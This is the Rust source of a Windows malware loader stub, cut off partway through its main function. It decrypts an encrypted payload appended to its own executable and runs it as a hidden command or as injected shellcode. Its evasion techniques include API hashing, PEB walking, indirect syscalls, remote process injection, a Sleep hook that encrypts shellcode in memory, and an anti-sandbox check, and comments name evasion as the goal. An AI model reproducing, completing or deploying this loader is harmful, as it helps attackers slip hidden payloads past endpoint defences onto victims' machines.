#![windows_subsystem = "console"]
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use std::fs;
use std::io::Read;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::Command;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    PAGE_READWRITE as PAGE_RW,
};
use windows_sys::Win32::System::SystemServices::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR,
    IMAGE_NT_SIGNATURE,
};
use windows_sys::Win32::System::Threading::GetCurrentThreadId;

static mut SLEEP_ORIGINAL: usize = 0;
static mut SC_ADDR: usize = 0;
static mut SC_SIZE: usize = 0;
static mut SC_THREAD_ID: u32 = 0;
static mut SSN_PROTECT: u32 = 0;
static mut ADDR_PROTECT: usize = 0;

const CREATE_NO_WINDOW: u32 = 0x08000000;

// Hashes (djb2, seed 5381)
const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0x4c6dc63c;
const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x6793c34c;
const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95f3a792;
const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x082962c8;
const HASH_NT_CREATE_THREAD_EX: u32 = 0xcb0c2130;
const HASH_NT_OPEN_PROCESS: u32 = 0x5003c058;

const MARKER: &[u8] = b"RSPKv1\0";

#[allow(dead_code)]
const HASH_KERNEL32: u32 = 0x6DDB9555; // "kernel32.dll" (djb2)
const HASH_VIRTUAL_ALLOC: u32 = 0x382c0f97;
#[allow(dead_code)]
const HASH_VIRTUAL_PROTECT: u32 = 0x844ef7bc;
#[allow(dead_code)]
const HASH_CREATE_THREAD: u32 = 0x835e515e;
#[allow(dead_code)]
const HASH_WAIT_FOR_SINGLE_OBJECT: u32 = 0x4c6dc63c;
const HASH_SLEEP: u32 = 0x0c926a54;

type FnVirtualAlloc = unsafe extern "system" fn(
    lp_address: *const core::ffi::c_void,
    dw_size: usize,
    fl_allocation_type: u32,
    fl_protect: u32,
) -> *mut core::ffi::c_void;

/*
type FnVirtualProtect = unsafe extern "system" fn(
    lpAddress: *mut core::ffi::c_void,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> i32;
*/
use windows_sys::Win32::System::Memory::VirtualProtect;

/*
#[allow(dead_code)]
type FnCreateThread = unsafe extern "system" fn(
    lp_thread_attributes: *const core::ffi::c_void,
    dw_stack_size: usize,
    lp_start_address: Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
    lp_parameter: *mut core::ffi::c_void,
    dw_creation_flags: u32,
    lp_thread_id: *mut u32,
) -> isize;
*/
// windows-sys CreateThread: fn CreateThread(lpthreadattributes: *const SECURITY_ATTRIBUTES, dwstacksize: usize, lpstartaddress: LPTHREAD_START_ROUTINE, lpparameter: *mut c_void, dwcreationflags: u32, lpthreadid: *mut u32) -> HANDLE
// HANDLE is isize.
#[allow(dead_code)]
type FnCreateThread = unsafe extern "system" fn(
    lp_thread_attributes: *const core::ffi::c_void,
    dw_stack_size: usize,
    lp_start_address: Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
    lp_parameter: *mut core::ffi::c_void,
    dw_creation_flags: u32,
    lp_thread_id: *mut u32,
) -> isize;

#[allow(dead_code)]
type FnWaitForSingleObject =
    unsafe extern "system" fn(h_handle: isize, dw_milliseconds: u32) -> u32;
#[allow(dead_code)]
type FnSleep = unsafe extern "system" fn(dw_milliseconds: u32);

// --- Utils ---

fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &b in s {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(b as u32);
    }
    hash
}

#[cfg(target_arch = "x86_64")]
unsafe fn get_ntdll_base() -> usize {
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    let ldr = *(peb.add(0x18) as *const *const u8);
    let mut entry = *(ldr.add(0x20) as *const *const u8); // InMemoryOrderModuleList

    loop {
        let dll_base = *(entry.add(0x20) as *const usize);
        let name_len = *(entry.add(0x48) as *const u16);
        let name_buf = *(entry.add(0x50) as *const *const u16);

        if !name_buf.is_null() {
            let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
            let s = String::from_utf16_lossy(name_slice);
            println!("Module: {}", s);
            if s.eq_ignore_ascii_case("ntdll.dll") {
                return dll_base;
            }
        }

        entry = *(entry as *const *const u8);
        if entry == *(ldr.add(0x20) as *const *const u8) {
            break;
        }
    }
    0
}

unsafe fn get_export_addr(base: usize, hash: u32) -> Option<usize> {
    let dos_header = base as *const u8;
    let e_lfanew = *(dos_header.add(0x3C) as *const u32) as usize;
    let nt_headers = dos_header.add(e_lfanew);
    let export_rva = *(nt_headers.add(0x88) as *const u32) as usize;
    if export_rva == 0 {
        return None;
    }

    let export_dir = dos_header.add(export_rva);
    let num_names = *(export_dir.add(0x18) as *const u32) as usize;
    let addr_funcs = *(export_dir.add(0x1C) as *const u32) as usize;
    let addr_names = *(export_dir.add(0x20) as *const u32) as usize;
    let addr_ords = *(export_dir.add(0x24) as *const u32) as usize;

    let names = dos_header.add(addr_names) as *const u32;
    let ords = dos_header.add(addr_ords) as *const u16;
    let funcs = dos_header.add(addr_funcs) as *const u32;

    for i in 0..num_names {
        let name_rva = *names.add(i) as usize;
        let name_ptr = dos_header.add(name_rva);
        let mut len = 0;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }
        let name_slice = core::slice::from_raw_parts(name_ptr, len);

        if djb2(name_slice) == hash {
            let ord = *ords.add(i) as usize;
            let func_rva = *funcs.add(ord) as usize;
            return Some(base + func_rva);
        }
    }
    None
}

// --- Indirect Syscall ---
// Returns (SSN, SyscallInstAddr)
unsafe fn get_ssn_indirect(hash: u32) -> Option<(u32, usize)> {
    let ntdll = get_ntdll_base();
    if ntdll == 0 {
        return None;
    }

    let addr = get_export_addr(ntdll, hash)?;
    let ptr = addr as *const u8;

    for i in 0..32 {
        if *ptr.add(i) == 0xB8 {
            // mov eax, SSN
            let ssn = *(ptr.add(i + 1) as *const u32);
            // Look for 'syscall; ret' (0F 05 C3)
            for j in 0..32 {
                if *ptr.add(i + j) == 0x0F
                    && *ptr.add(i + j + 1) == 0x05
                    && *ptr.add(i + j + 2) == 0xC3
                {
                    return Some((ssn, (ptr.add(i + j) as usize)));
                }
            }
        }
    }
    None
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn syscall(
    ssn: u32,
    syscall_addr: usize,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> i32 {
    let ret: i32;
    core::arch::asm!(
        "sub rsp, 0x60",
        "mov [rsp + 0x20], {a5}", "mov [rsp + 0x28], {a6}", "mov [rsp + 0x30], {a7}",
        "mov [rsp + 0x38], {a8}", "mov [rsp + 0x40], {a9}", "mov [rsp + 0x48], {a10}",
        "mov [rsp + 0x50], {a11}",
        "mov eax, {ssn:e}",
        "call {syscall_addr}", // Indirect Syscall: CALL the address of 'syscall' instruction in ntdll
        "add rsp, 0x60",
        in("r10") a1, in("rdx") a2, in("r8") a3, in("r9") a4,
        a5 = in(reg) a5, a6 = in(reg) a6, a7 = in(reg) a7, a8 = in(reg) a8,
        a9 = in(reg) a9, a10 = in(reg) a10, a11 = in(reg) a11, ssn = in(reg) ssn, syscall_addr = in(reg) syscall_addr,
        lateout("rax") ret, lateout("rcx") _, lateout("r11") _,
        options(nostack)
    );
    ret
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
unsafe fn syscall(
    _ssn: u32,
    _syscall_addr: usize,
    _a1: usize,
    _a2: usize,
    _a3: usize,
    _a4: usize,
    _a5: usize,
    _a6: usize,
    _a7: usize,
    _a8: usize,
    _a9: usize,
    _a10: usize,
    _a11: usize,
) -> i32 {
    0
}

// --- Obscure Sleep (Removed) ---

#[repr(C)]
#[allow(non_snake_case)]
#[allow(non_camel_case_types)]
struct OBJECT_ATTRIBUTES {
    Length: u32,
    RootDirectory: isize,
    ObjectName: isize,
    Attributes: u32,
    SecurityDescriptor: isize,
    SecurityQualityOfService: isize,
}

#[repr(C)]
#[allow(non_snake_case)]
#[allow(non_camel_case_types)]
struct CLIENT_ID {
    UniqueProcess: isize,
    UniqueThread: isize,
}

unsafe fn exec_remote(sc: &[u8], path: &str) {
    let child = std::process::Command::new(path)
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();
    let Ok(child) = child else { return };
    let pid = child.id();

    let (ssn_open, addr_open) = get_ssn_indirect(HASH_NT_OPEN_PROCESS).unwrap_or((0x26, 0));
    let (ssn_alloc, addr_alloc) =
        get_ssn_indirect(HASH_NT_ALLOCATE_VIRTUAL_MEMORY).unwrap_or((0x18, 0));
    let (ssn_write, addr_write) =
        get_ssn_indirect(HASH_NT_WRITE_VIRTUAL_MEMORY).unwrap_or((0x3A, 0));
    let (ssn_protect, addr_protect) =
        get_ssn_indirect(HASH_NT_PROTECT_VIRTUAL_MEMORY).unwrap_or((0x50, 0));
    let (ssn_create, addr_create) = get_ssn_indirect(HASH_NT_CREATE_THREAD_EX).unwrap_or((0xBD, 0));
    let (ssn_wait, addr_wait) =
        get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));

    if addr_open == 0 {
        return;
    }

    let mut h_proc: isize = 0;
    let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
    oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
    let mut cid = CLIENT_ID {
        UniqueProcess: pid as isize,
        UniqueThread: 0,
    };

    let st_open = syscall(
        ssn_open,
        addr_open,
        &mut h_proc as *mut _ as usize,
        0x1FFFFF,
        &mut oa as *mut _ as usize,
        &mut cid as *mut _ as usize,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    );
    if st_open != 0 || h_proc == 0 {
        return;
    }

    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut size = sc.len();
    let _ = syscall(
        ssn_alloc,
        addr_alloc,
        h_proc as usize,
        &mut base as *mut _ as usize,
        0,
        &mut size as *mut _ as usize,
        (MEM_COMMIT | MEM_RESERVE) as usize,
        PAGE_READWRITE as usize,
        0,
        0,
        0,
        0,
        0,
    );

    if !base.is_null() {
        let mut written = 0usize;
        let _ = syscall(
            ssn_write,
            addr_write,
            h_proc as usize,
            base as usize,
            sc.as_ptr() as usize,
            sc.len(),
            &mut written as *mut _ as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        let mut old = 0usize;
        let _ = syscall(
            ssn_protect,
            addr_protect,
            h_proc as usize,
            &mut base as *mut _ as usize,
            &mut size as *mut _ as usize,
            PAGE_EXECUTE_READ as usize,
            &mut old as *mut _ as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        let mut h_thread: isize = 0;
        let st_thr = syscall(
            ssn_create,
            addr_create,
            &mut h_thread as *mut _ as usize,
            0x1FFFFF,
            0,
            h_proc as usize,
            base as usize,
            0,
            0,
            0,
            0,
            0,
            0,
        );
        println!("CreateThread status: {:x}, handle: {:x}", st_thr, h_thread);
        if st_thr == 0 && h_thread != 0 {
            println!("Waiting for thread...");
            let _ = syscall(
                ssn_wait,
                addr_wait,
                h_thread as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
            );
            println!("Thread finished or wait returned");
            CloseHandle(h_thread);
        } else {
            println!("CreateThread failed");
        }
    } else {
        println!("Allocation failed");
    }
    CloseHandle(h_proc);
}

unsafe fn hook_iat(target_dll: &str, target_func: &str, new_func: usize) -> Option<usize> {
    let base = GetModuleHandleA(core::ptr::null());
    if base == 0 {
        return None;
    }

    let dos_header = base as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_headers = (base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    // IMAGE_DIRECTORY_ENTRY_IMPORT = 1
    let import_dir = (*nt_headers).OptionalHeader.DataDirectory[1];
    if import_dir.VirtualAddress == 0 {
        return None;
    }

    let mut import_desc =
        (base as usize + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;

    while (*import_desc).Name != 0 {
        let name_ptr = (base as usize + (*import_desc).Name as usize) as *const u8;
        let name_len = (0..).find(|&i| *name_ptr.add(i) == 0).unwrap();
        let name_slice = core::slice::from_raw_parts(name_ptr, name_len);
        let name = String::from_utf8_lossy(name_slice);

        if name.eq_ignore_ascii_case(target_dll) {
            let mut thunk = (base as usize + (*import_desc).FirstThunk as usize) as *mut u64;
            let mut orig_thunk = (base as usize
                + (*import_desc).Anonymous.OriginalFirstThunk as usize)
                as *const u64;
            if (*import_desc).Anonymous.OriginalFirstThunk == 0 {
                orig_thunk = thunk as *const _;
            }

            while *orig_thunk != 0 {
                if *orig_thunk & 0x8000_0000_0000_0000 == 0 {
                    // Not ordinal
                    let import_by_name =
                        (base as usize + *orig_thunk as usize) as *const IMAGE_IMPORT_BY_NAME;
                    let func_name_ptr = &(*import_by_name).Name as *const u8;
                    let func_len = (0..).find(|&i| *func_name_ptr.add(i) == 0).unwrap();
                    let func_slice = core::slice::from_raw_parts(func_name_ptr, func_len);
                    let func_str = String::from_utf8_lossy(func_slice);

                    if func_str.eq_ignore_ascii_case(target_func) {
                        let original = *thunk as usize;

                        /*
                                                 // VirtualProtect(thunk as *mut _, 8, PAGE_RW, &mut old_prot);
                                                 let k32 = get_kernel32_base();
                                                 let mut old_prot = 0;
                                                 if k32 != 0 {
                                                      if let Some(addr) = get_export_addr(k32, HASH_VIRTUAL_PROTECT) {
                                                          let vp: FnVirtualProtect = core::mem::transmute(addr);
                                                          vp(thunk as *mut _, 8, PAGE_RW, &mut old_prot);
                                                      }
                                                 }
                                                 *thunk = new_func as u64;
                                                 // VirtualProtect(thunk as *mut _, 8, old_prot, &mut old_prot);
                                                  if k32 != 0 {
                                                      if let Some(addr) = get_export_addr(k32, HASH_VIRTUAL_PROTECT) {
                                                          let vp: FnVirtualProtect = core::mem::transmute(addr);
                                                          vp(thunk as *mut _, 8, old_prot, &mut old_prot);
                                                      }
                                                 }
                        */
                        let mut old_prot = 0;
                        VirtualProtect(thunk as *mut _, 8, PAGE_RW, &mut old_prot);
                        *thunk = new_func as u64;
                        VirtualProtect(thunk as *mut _, 8, old_prot, &mut old_prot);

                        return Some(original);
                    }
                }
                thunk = thunk.add(1);
                orig_thunk = orig_thunk.add(1);
            }
        }
        import_desc = import_desc.add(1);
    }
    None
}

/*
    // Fallback to GetModuleHandleA if manual parsing fails (or just use it directly for now to fix functionality)
    // Actually, let's try to fix the manual parsing first.
    // The previous manual parsing used InMemoryOrderModuleList (offset 0x20).
    // InMemoryOrder:
    // LIST_ENTRY InMemoryOrderLinks; // 0x00
    // ...
    // PVOID DllBase; // 0x20 in LDR_DATA_TABLE_ENTRY?
    // Wait, LDR_DATA_TABLE_ENTRY structure:
    // InLoadOrderLinks (0x00)
    // InMemoryOrderLinks (0x10)
    // InInitializationOrderLinks (0x20)
    // DllBase (0x30)
    // EntryPoint (0x38)
    // SizeOfImage (0x40)
    // FullDllName (0x48)
    // BaseDllName (0x58)

    // If we iterate InLoadOrderLinks (start at LDR + 0x10), then entry points to LDR_DATA_TABLE_ENTRY directly.
    // DllBase is at 0x30.
    // BaseDllName is at 0x58 (UNICODE_STRING).

    // If we iterate InMemoryOrderLinks (start at LDR + 0x20), then entry points to LDR_DATA_TABLE_ENTRY + 0x10.
    // So DllBase is at (0x30 - 0x10) = 0x20. Correct.
    // BaseDllName is at (0x58 - 0x10) = 0x48. Correct.

    // So the offsets were correct for InMemoryOrder.
    // Why did it fail? Maybe case sensitivity or just "kernel32.dll" not found in the list?
    // It worked for VirtualAlloc (it returned a base).
    // Wait, "Alloc ptr: 0x..." means VirtualAlloc worked.
    // So get_kernel32_base() IS WORKING.

    // The issue is VirtualProtect returned 0.
    // "Protect result: 0"
    // "Protect failed"

    // Why would VirtualProtect fail?
    // base is correct. size is correct.
    // Maybe HASH_VIRTUAL_PROTECT is wrong?
    // I calculated hashes using djb2 in python:
    // hex(djb2('VirtualProtect')) -> 0x844ef7bc
    // My code: const HASH_VIRTUAL_PROTECT: u32 = 0x844ef7bc;
    // Hash is correct.

    // Maybe calling convention?
    // type FnVirtualProtect = unsafe extern "system" fn ... -> i32;
    // "system" is stdcall on x86, C on x64 (Win64). Correct.

    // Maybe GetLastError?

    // Wait, I am using `core::mem::transmute(addr)`.
    // Maybe `get_export_addr` is returning a valid address?
    // If VirtualAlloc worked, then `get_export_addr` works for VirtualAlloc.

    // Let's verify the address of VirtualProtect.

    let peb: *const u8;
    #[cfg(target_arch = "x86_64")]
    {
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    }
    #[cfg(target_arch = "x86")]
    {
        core::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
    }

    let ldr = *(peb.add(0x18) as *const *const u8);
    let mut entry = *(ldr.add(0x20) as *const *const u8); // InMemoryOrderModuleList

    loop {
        let dll_base = *(entry.add(0x20) as *const usize);
        let name_len = *(entry.add(0x48) as *const u16);
        let name_buf = *(entry.add(0x50) as *const *const u16);

        if !name_buf.is_null() {
            let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
            let s = String::from_utf16_lossy(name_slice);
            if s.eq_ignore_ascii_case("kernel32.dll") {
                return dll_base;
            }
        }

        entry = *(entry as *const *const u8);
        if entry == *(ldr.add(0x20) as *const *const u8) {
            break;
        }
    }
    0
*/
/*
    // loop {
    //     let dll_base = *(entry.add(0x20) as *const usize);
    //     let name_len = *(entry.add(0x48) as *const u16);
    //     let name_buf = *(entry.add(0x50) as *const *const u16);

    //     if !name_buf.is_null() {
    //         let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
    //         let s = String::from_utf16_lossy(name_slice);
    //         if s.eq_ignore_ascii_case("kernel32.dll") {
    //             return dll_base;
    //         }
    //     }

    //     entry = *(entry as *const *const u8);
    //     if entry == *(ldr.add(0x20) as *const *const u8) {
    //         break;
    //     }
    // }
    // 0
    let mut entry = *(ldr.add(0x10) as *const *const u8); // InLoadOrderModuleList
    loop {
         let dll_base = *(entry.add(0x30) as *const usize);
         let name_len = *(entry.add(0x58) as *const u16);
         let name_buf = *(entry.add(0x60) as *const *const u16);

         if !name_buf.is_null() {
             let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
             let s = String::from_utf16_lossy(name_slice);
             if s.to_uppercase().contains("KERNEL32.DLL") {
                 return dll_base;
             }
         }
         entry = *entry;
         if entry == *(ldr.add(0x10) as *const *const u8) { break; }
    }
    0
*/
unsafe fn get_kernel32_base() -> usize {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    // For now, use GetModuleHandleA directly to ensure functionality.
    // Manual parsing might be failing due to structure mismatch or offset issues in this environment.
    // Evasion: GetModuleHandleA is common, but hiding it via manual parsing is better.
    // However, fixing functionality is priority.
    let h = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    if h != 0 {
        return h as usize;
    }

    /*
        // Fallback to manual parsing if GetModuleHandleA returns 0 (unlikely for kernel32)
        let peb: *const u8;
        #[cfg(target_arch = "x86_64")]
        {
            core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        }
        #[cfg(target_arch = "x86")]
        {
            core::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
        }

        let ldr = *(peb.add(0x18) as *const *const u8);
        let mut entry = *(ldr.add(0x20) as *const *const u8); // InMemoryOrderModuleList

        loop {
            let dll_base = *(entry.add(0x20) as *const usize);
            let name_len = *(entry.add(0x48) as *const u16);
            let name_buf = *(entry.add(0x50) as *const *const u16);

            if !name_buf.is_null() {
                let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
                let s = String::from_utf16_lossy(name_slice);
                if s.eq_ignore_ascii_case("kernel32.dll") {
                    return dll_base;
                }
            }

            entry = *(entry as *const *const u8);
            if entry == *(ldr.add(0x20) as *const *const u8) {
                break;
            }
        }
        0
    */
    0
}

unsafe extern "system" fn sleep_detour(dw_milliseconds: u32) {
    let do_fluctuation = SC_ADDR != 0 && SC_SIZE != 0 && GetCurrentThreadId() == SC_THREAD_ID;

    if do_fluctuation {
        // RW
        let mut old_prot = 0;
        let base = SC_ADDR as *mut core::ffi::c_void;
        let size = SC_SIZE;
        // VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
        // Use dynamic resolution here too if possible, but we are inside hook.
        // For simplicity/stability inside hook, we can use the resolved pointer if we stored it globally,
        // or just use the static import (but we want to remove static import).
        // Let's re-resolve or use a global.

        /*
                let k32 = get_kernel32_base();
                if k32 != 0 {
                     if let Some(addr) = get_export_addr(k32, HASH_VIRTUAL_PROTECT) {
                         let vp: FnVirtualProtect = core::mem::transmute(addr);
                         vp(base, size, PAGE_READWRITE, &mut old_prot);
                     }
                }
        */
        VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);

        // Encrypt
        let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
        for b in slice.iter_mut() {
            *b ^= 0xAA;
        }
    }

    if SLEEP_ORIGINAL != 0 {
        let original: unsafe extern "system" fn(u32) = core::mem::transmute(SLEEP_ORIGINAL);
        original(dw_milliseconds);
    }

    if do_fluctuation {
        // Decrypt
        let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
        for b in slice.iter_mut() {
            *b ^= 0xAA;
        }

        // RX/RWX
        let mut old_prot = 0;
        let base = SC_ADDR as *mut core::ffi::c_void;
        let size = SC_SIZE;
        /*
        // VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old_prot);
        let k32 = get_kernel32_base();
        if k32 != 0 {
            if let Some(addr) = get_export_addr(k32, HASH_VIRTUAL_PROTECT) {
                let vp: FnVirtualProtect = core::mem::transmute(addr);
                vp(base, size, PAGE_EXECUTE_READWRITE, &mut old_prot);
            }
        }
        */
        VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old_prot);
    }
}

/*
unsafe extern "system" fn thread_wrapper(lp_parameter: *mut core::ffi::c_void) -> u32 {
    let code: unsafe extern "system" fn() = core::mem::transmute(lp_parameter);
    code();
    0
}
*/

fn main() {
    // Polymorphism: Random-looking control flow that does nothing
    let mut x = 12345u64;
    for _ in 0..100 {
        x = x
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
    }
    if x == 0 {
        // println!("Polymorphic check");
    }

    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    println!("Stub started, exe: {:?}", exe_path);
    let mut buf = Vec::new();
    if fs::File::open(&exe_path)
        .and_then(|mut f| f.read_to_end(&mut buf))
        .is_err()
    {
        println!("Failed to read self");
        return;
    }

    let pos = buf.windows(MARKER.len()).rposition(|w| w == MARKER);
    let Some(mut off) = pos.map(|p| p + MARKER.len()) else {
        println!("Marker not found in {} bytes", buf.len());
        return;
    };
    println!("Marker found at offset {}", off);

    if off + 4 > buf.len() {
        println!("Truncated key len");
        return;
    }
    let key_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if off + key_len > buf.len() {
        println!("Truncated key");
        return;
    }
    let key = &buf[off..off + key_len];
    off += key_len;

    if off + 4 > buf.len() {
        println!("Truncated nonce len");
        return;
    }
    let nonce_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if off + nonce_len > buf.len() {
        println!("Truncated nonce");
        return;
    }
    let nonce_bytes = &buf[off..off + nonce_len];
    off += nonce_len;

    if off + 8 > buf.len() {
        println!("Truncated ct len");
        return;
    }
    let ct_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
    off += 8;
    if off + ct_len > buf.len() {
        println!("Truncated ciphertext");
        return;
    }
    let ciphertext = &buf[off..off + ct_len];

    println!("Decrypting {} bytes...", ct_len);
    let cipher = match Aes256Gcm::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => {
            println!("Cipher init failed");
            return;
        }
    };
    let nonce = Nonce::from_slice(nonce_bytes);
    let decrypted = match cipher.decrypt(nonce, ciphertext) {
        Ok(p) => p,
        Err(_) => {
            println!("Decryption failed");
            return;
        }
    };
    println!("Decryption success, decompressing...");
    let payload = match zstd::decode_all(&decrypted[..]) {
        Ok(p) => p,
        Err(e) => {
            println!("Decompression failed: {}", e);
            return;
        }
    };
    println!("Decompression success, payload size: {}", payload.len());

    if payload.starts_with(b"CMD\0") {
        println!("Payload type: CMD");
        let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
        let exe_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.to_path_buf()))
            .unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| std::env::temp_dir()));
        let lower = cmd.trim().to_lowercase();
        if lower.starts_with("echo ") && cmd.contains('>') {
            let parts: Vec<&str> = cmd.splitn(2, '>').collect();
            let left = parts.get(0).map(|s| s.trim()).unwrap_or("");
            let right = parts.get(1).map(|s| s.trim()).unwrap_or("");
            let content = left.strip_prefix("echo").map(|s| s.trim()).unwrap_or("");
            if !right.is_empty() {
                let mut out_path = exe_dir.clone();
                out_path.push(right);
                let _ = fs::write(&out_path, format!("{}\r\n", content));
            }
        } else {
            if Command::new(&cmd)
                .current_dir(&exe_dir)
                .creation_flags(CREATE_NO_WINDOW)
                .spawn()
                .is_err()
            {
                let _ = Command::new("cmd.exe")
                    .arg("/C")
                    .arg(&cmd)
                    .current_dir(&exe_dir)
                    .creation_flags(CREATE_NO_WINDOW)
                    .spawn();
            }
        }
        return;
    }

    if payload.starts_with(b"SC\0") {
        println!("Payload type: SC");
        let mut p = 3usize;
        if p >= payload.len() {
            println!("SC Payload too short");
            return;
        }
        let mode = payload[p];
        p += 1;
        let mut remote_path: Option<String> = None;
        if mode == 1 {
            if p + 4 > payload.len() {
                return;
            }
            let rlen = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
            p += 4;
            if p + rlen > payload.len() {
                return;
            }
            remote_path = Some(String::from_utf8_lossy(&payload[p..p + rlen]).to_string());
            p += rlen;
        }
        if p + 4 > payload.len() {
            return;
        }
        let sc_len = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
        p += 4;
        if p + sc_len > payload.len() {
            return;
        }
        let sc = &payload[p..p + sc_len];
        println!("SC extracted, len: {}, mode: {}", sc_len, mode);

        // Skip unhooking for now to rule it out
        // if unhook {
        //     if let Err(e) = unhook_ntdll() {
        //         println!("Unhooking failed: {}", e);
        //     } else {
        //         println!("Unhooking success");
        //     }
        // }

        unsafe {
            let ntdll = get_ntdll_base();
            println!("NTDLL Base: {:x}", ntdll);

            if ntdll == 0 {
                println!("Failed to find NTDLL base");
                return;
            }

            let (ssn_alloc, addr_alloc) =
                get_ssn_indirect(HASH_NT_ALLOCATE_VIRTUAL_MEMORY).unwrap_or((0x18, 0));
            let (_ssn_write, _addr_write) =
                get_ssn_indirect(HASH_NT_WRITE_VIRTUAL_MEMORY).unwrap_or((0x3A, 0));
            let (ssn_protect, addr_protect) =
                get_ssn_indirect(HASH_NT_PROTECT_VIRTUAL_MEMORY).unwrap_or((0x50, 0));

            SSN_PROTECT = ssn_protect;
            ADDR_PROTECT = addr_protect;

            println!("SSN Alloc: {:x}, Addr: {:x}", ssn_alloc, addr_alloc);

            if addr_alloc == 0 {
                println!("Failed to resolve NtAllocateVirtualMemory");
                return;
            }

            if mode == 1 {
                if let Some(s) = remote_path.as_deref() {
                    println!("Injecting into remote process: {}", s);
                    exec_remote(sc, s);
                }
            } else {
                let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
                let mut size = sc_len;

                // Open self to get a real handle
                // let mut process_handle: isize = 0;
                // let (ssn_open, addr_open) = get_ssn_indirect(HASH_NT_OPEN_PROCESS).unwrap_or((0x26, 0));
                // if addr_open != 0 {
                //     let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
                //     oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
                //     let mut cid = CLIENT_ID {
                //         UniqueProcess: unsafe { GetCurrentProcessId() } as isize,
                //         UniqueThread: 0,
                //     };
                //     let st_open = syscall(
                //         ssn_open,
                //         addr_open,
                //         &mut process_handle as *mut _ as usize,
                //         0x1FFFFF, // PROCESS_ALL_ACCESS
                //         &mut oa as *mut _ as usize,
                //         &mut cid as *mut _ as usize,
                //         0, 0, 0, 0, 0, 0, 0,
                //     );
                //     println!("NtOpenProcess status: {:x}, handle: {:x}", st_open, process_handle);
                // }

                // if process_handle == 0 {
                //     println!("Failed to open self, using -1");
                //     process_handle = -1isize as usize as isize;
                // }
                let process_handle = -1isize as usize as isize;

                // Get Kernel32 Base
                let k32 = get_kernel32_base();
                if k32 == 0 {
                    println!("Failed to find Kernel32");
                    return;
                }

                // Anti-Sandbox: Check Memory
                use windows_sys::Win32::System::SystemInformation::{
                    GlobalMemoryStatusEx, MEMORYSTATUSEX,
                };
                let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
